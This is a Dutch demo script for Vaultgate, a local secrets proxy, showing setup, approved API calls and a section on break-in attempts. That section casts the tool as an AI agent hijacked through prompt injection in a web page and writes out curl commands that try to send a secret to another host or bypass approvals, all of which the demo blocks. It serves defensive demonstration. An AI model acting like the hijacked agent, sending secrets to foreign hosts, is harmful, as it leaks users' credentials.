# Demo-draaiboek Vaultgate

Een demo van ongeveer 20 minuten. Je laat zien hoe een tool een API gebruikt zonder ooit de sleutel te zien, en hoe Vaultgate standaard dicht blijft als iets of iemand probeert binnen te geraken. Er zijn geen echte sleutels nodig: de doelhost is een mock-provider op je eigen pc.

## Voorbereiding (2 min, vóór het publiek kijkt)

```powershell
cd <repo>   # de map waar Vaultgate staat
npm run demo -- --fresh
```

Dat start drie dingen:
- de **mock-provider** op `http://127.0.0.1:5099` (`/echo` toont wat er binnenkwam);
- **Vaultgate**, het echte proces: proxy op `127.0.0.1:8484`, portaal op `localhost:8485`, en het slot-icoon in de tray;
- het **portaalvenster**, een eigen Edge-venster zonder extensies.

Alles komt in `outputs/demo-home`; je echte kluis wordt nooit geraakt. Ctrl+C stopt alles.

Open een tweede PowerShell-venster voor de calls. Zet daar de proxy in een variabele:

```powershell
$P = "http://127.0.0.1:8484"; $M = "http://127.0.0.1:5099"
```

Gebruik altijd `curl.exe`, niet `curl`: in Windows PowerShell 5.1 is `curl` een alias voor `Invoke-WebRequest`.

## Deel 1: inrichten (5 min)

1. **Kluis aanmaken.** Het portaal toont "Aan de slag". Kies een passphrase.
   *Vertel:* alles op schijf is versleuteld, ook de namen en de audit. De passphrase gaat door Argon2id.
2. **Herstelcode.** Toon ze, en bevestig met de laatste 4 tekens.
   *Vertel:* de code wordt maar één keer getoond; het is de enige weg terug als je passkeys kwijt zijn.
3. **Passkey registreren** (Windows Hello of een security key), liefst twee.
   *Vertel:* de passkey ontgrendelt ook de kluis (PRF). Een passkey kan niet gestolen worden met een kopie van de schijf.
4. **Secret** (tabblad Secrets):
   - naam `demo`
   - waarde `sk-demo-geheim-1234567890`
   - host `http://127.0.0.1:5099`

   *Vertel:* na het opslaan toont het portaal de waarde nooit meer, ook niet in de API.
5. **Tool koppelen zonder key te kopiëren** (device flow). In het tweede venster:
   ```powershell
   node src/main.js login --name agent --proxy $P --home outputs/demo-home --print
   ```
   De CLI toont een code. De tray-pop-up "Een tool vraagt een key: koppelen?" toont dezelfde code en "(nieuw)". Klik **Toestaan**. De key verschijnt in het venster; zet ze in een variabele:
   ```powershell
   $K = "<de ks_-key>"
   ```
   *Vertel:* de tool krijgt alleen een eigen key, nooit de echte API-sleutel. (Gewoon in het portaal onder Tools kan ook.)

## Deel 2: een gewone call (3 min)

6. **Een call met een plaatshouder.** De tool zet `{{secret:demo}}` waar de sleutel moet komen:
   ```powershell
   curl.exe -s "$P/forward/$M/echo" -H "x-vault-gate-tool-key: $K" -H "Authorization: Bearer {{secret:demo}}" -d "{}"
   ```
   De tray vraagt toestemming voor de nieuwe combinatie tool × secret × host, met `Request: POST /echo`. Klik **Eenmalig**.

   *Laat zien:* de echo toont `"authorization":"Bearer ***"`. Het echte secret kwam aan bij de doelhost, maar alles wat terugkomt naar de tool wordt geschrapt (ook in base64 of hex).
7. **Dezelfde call opnieuw.** De tray vraagt opnieuw, want "eenmalig" is eenmalig. Klik nu **Altijd**: er komt een toekenning. Een derde call gaat zonder vraag door.
8. **Audit** (tabblad Audit): elke call met de regel die besliste (`approved-once`, `approved-always`, `granted`).

## Deel 3: proberen binnen te geraken (8 min)

*Vertel:* "Stel dat de tool een AI-agent is die gemanipuleerd wordt via een prompt in een webpagina."

9. **Het secret naar een andere host sturen:**
   ```powershell
   curl.exe -s -i "$P/forward/https://example.com/" -H "x-vault-gate-tool-key: $K" -H "Authorization: Bearer {{secret:demo}}"
   ```
   Resultaat: `403` met `x-vault-gate-rule: target-host-not-allowed`. Het secret werd niet eens ontsleuteld.
10. **Zonder key, of met een verzonnen key:**
    ```powershell
    curl.exe -s -i "$P/forward/$M/echo" -H "x-vault-gate-tool-key: ks_verzonnen" -H "Authorization: Bearer {{secret:demo}}"
    ```
    Resultaat: `401`, `no-tool-key`.
11. **Eén klik, veel requests** (eerst de toekenning van stap 7 intrekken in Toekenningen):
    ```powershell
    $jobs = 1..3 | ForEach-Object { Start-Job { curl.exe -s -o NUL -w "%{http_code}`n" "$using:P/forward/$using:M/echo" -H "x-vault-gate-tool-key: $using:K" -H "Authorization: Bearer {{secret:demo}}" -d "{}" } }
    ```
    Eén pop-up; klik **Eenmalig**. Er gaat precies één request door, en de pop-up komt terug voor de volgende. Klik **Weigeren**: dat geldt voor alle wachtende requests.
    ```powershell
    $jobs | Wait-Job | Receive-Job   # 200, 403, 403
    ```
12. **Een andere tool die zich als "agent" voordoet:**
    ```powershell
    node src/main.js login --name agent --proxy $P --home outputs/demo-home --print
    ```
    Resultaat: meteen `name_taken`, geen pop-up. Een bestaande tool en haar toekenningen kunnen niet overgenomen worden.
13. **Intrekken** (Tools, "Intrekken" bij agent), dan stap 6 opnieuw: `401 tool-key-revoked`. Ook "Nieuwe key" heft de intrekking niet op; daarvoor is er een aparte knop "Heractiveren".
14. **Sluiten**: tray-menu "Log out (close vault)", dan stap 6 opnieuw: na de goedkeurings-time-out `401 approval-timeout`, net als een vraag die niemand goedkeurt. Zonder open kluis vertrekt er niets. ("Lock now" sluit alleen het portaal; tools werken door.)

## Afsluiten (1 min)

- In de proceslog (`outputs/demo-home/demo.log`) en in de audit staat nergens de waarde `sk-demo-geheim-1234567890`. Controleer live met `Select-String sk-demo outputs/demo-home/demo.log` (geen resultaat).
- Wat niet in de demo zit, maar wel getest is:
  - een certificaat dat eindigt bij een root buiten de lijst van geldige roots: geen secret tot je het vertrouwt (`docs/screenshots/portaal-15-certificaat-niet-vertrouwd.png`); een nieuw tussencertificaat of een andere leverancier met een geldige root geeft geen melding;
  - een audit die niet geschreven kan worden: `503 audit-unavailable` en na 3 keer een vergrendelde kluis;
  - Claude Code via Vaultgate (`docs/claude-code.md`).

## Als iets misgaat

| symptoom | oorzaak / oplossing |
|---|---|
| `EADDRINUSE` bij de start | Er draait al iets op 8484, 8485 of 5099: een oude demo of een echte Vaultgate. Stoppen, of `node scripts/demo.mjs --home outputs/demo-home` na het stoppen. |
| Geen pop-up | De tray start pas na een paar seconden; kijk in het systeemvak (pijltje `^`). Zonder tray antwoordt de proxy `approval-unavailable`. |
| `approval-timeout` | De pop-up wacht 30 s (instelbaar in Instellingen). |
| Passkey lukt niet | Windows Hello moet ingesteld zijn; anders een USB-security key of je telefoon (zie "Een tweede passkey"). De Bitwarden-extensie werkt niet in het portaalvenster (extensies staan uit). |

## Een tweede passkey (en Bitwarden)

Vraag van de product owner (2026-10-10): "hoe voeg ik een Bitwarden-passkey toe, anders hoe kan ik voor een tweede zorgen?" Registreren gaat in het portaal (Passkeys, "Passkey toevoegen"); welke authenticator je krijgt, kiest Windows in zijn eigen dialoog.

**Waarom de Bitwarden-extensie niet werkt**: het portaalvenster draait met een eigen profiel en `--disable-extensions` (aanvalspad A17 in `docs/threat-model-agent.md`: een extensie kan meelezen wat je typt). De extensie bestaat in dat venster dus niet. Daarnaast melden gebruikers dat de extensie op `localhost` geen passkeys aanbiedt ([forum](https://community.bitwarden.com/t/do-passkeys-work-on-localhost/81764)).

Wat wel kan, in de Windows-dialoog bij "Passkey toevoegen":

| tweede passkey | hoe | PRF (kluis ontgrendelen zonder passphrase) | geverifieerd |
|---|---|---|---|
| **USB-security key** (YubiKey, Token2 …) | "Security key" kiezen, aanraken | ja, bij sleutels met `hmac-secret` (de meeste FIDO2-sleutels) | ja, met de virtuele authenticator in de tests; met een echte sleutel niet door mij |
| **Telefoon** (Android: Google Password Manager; iPhone: iCloud-sleutelhanger) | "Een ander apparaat gebruiken", QR scannen, Bluetooth aan | Android en iOS 18+ ondersteunen PRF | nee |
| **Bitwarden als Windows-passkeyprovider** (Bitwarden-desktop als plug-in in Windows 11, sinds de update van november 2025; volgens berichten nog bèta via GitHub) | Bitwarden-desktop installeren en in Windows (Instellingen, Accounts, Passkeys) als provider aanzetten; dan biedt de Windows-dialoog Bitwarden aan, ook zonder extensie | onbekend | nee |
| **Bitwarden-app op de telefoon** | zoals "Telefoon", met Bitwarden als passkeyprovider op de telefoon | onbekend | nee |

**Zonder PRF** werkt de passkey wel om in te loggen, maar ontgrendel je de kluis daarna met de passphrase (het portaal toont dat: "ontgrendelen zonder PRF").

**Advies**: Windows Hello plus een USB-security key, of plus je telefoon. Bewaar de herstelcode los daarvan.

Bronnen: [Bitwarden: passkeys op Windows 11 (BleepingComputer)](https://www.bleepingcomputer.com/news/security/bitwarden-adds-support-for-passkey-login-on-windows-11), [Windows 11 met Bitwarden en 1Password (CyberInsider)](https://cyberinsider.com/windows-11-integrates-native-support-for-bitwarden-and-1password/), [Bitwarden en PRF](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/).
